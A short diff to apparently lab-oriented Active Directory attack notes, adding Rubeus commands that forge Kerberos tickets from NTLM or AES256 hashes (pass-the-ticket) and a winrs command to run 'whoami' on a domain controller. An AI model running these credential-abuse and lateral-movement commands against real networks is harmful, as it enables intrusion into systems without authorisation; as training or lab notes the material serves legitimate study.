@@ -9,8 +9,12 @@ winrs -r:<MACCHINA> cmd
 ```powershell
 rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
 ```
+```cmd
+Rubeus.exe asktgt /user:<USER> /aes256:<HASH> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+Use winrs to test
 ```powershell
-Rubeus.exe asktgt /user:svcadmin /aes256:<HASH> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+winrs -r:dcorp-dc whoami
 ```
 ### **Other Sessions Opened**
 ```powerview
